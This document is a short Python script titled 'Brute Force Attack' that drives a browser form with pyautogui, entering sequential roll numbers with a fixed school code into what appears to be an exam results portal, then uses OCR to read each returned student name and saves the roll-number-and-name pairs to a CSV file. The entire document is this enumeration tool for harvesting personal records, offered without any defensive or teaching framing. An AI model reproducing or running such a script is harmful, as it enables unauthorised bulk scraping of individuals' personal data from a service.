# Brute Force Attack

import numpy as nm
import pytesseract
import cv2
from PIL import ImageGrab
import pyautogui as p
from time import sleep
import csv

fields = ["Roll Number", "Name"]
csvfile = open("record.csv", 'w', newline = "")
writer = csv.writer(csvfile)
writer.writerow(fields)


def imToString(coordinates):
    pytesseract.pytesseract.tesseract_cmd ='C:\\Program Files (x86)\\Tesseract-OCR\\tesseract.exe'
    cap = ImageGrab.grab(bbox = coordinates)                                                        # capturing the image with specific coordinates
    cap = cv2.resize(nm.array(cap), None, fx=1.8, fy=1.8, interpolation=cv2.INTER_CUBIC)            # resizing the image for accuracy
    tesstr = pytesseract.image_to_string(                                                           # converitng to text using OCR
			cv2.cvtColor(nm.array(cap), cv2.COLOR_BGR2GRAY),
			lang ='eng')
    return tesstr

s_code = '23506'
t = 1.5     # default = 1.5

p.moveTo(x=1247, y=18)
p.click()

for r_no in range(13704055, 13704328):
    
    p.moveTo(x=757, y=338)
    p.click()       
    p.write(str(r_no))
    p.moveTo(x=757, y=363)
    p.click()
    p.write(s_code)
    p.press('enter')
    sleep(t)
    roll_no = imToString((401, 252, 470, 270))
    sleep(t)
    name = imToString((401, 270, 580, 290))
    row = [roll_no, name]
    writer.writerow(row)
    # print(roll_no, name)
    p.press('tab', presses = 2)
    p.press('enter')
    sleep(t)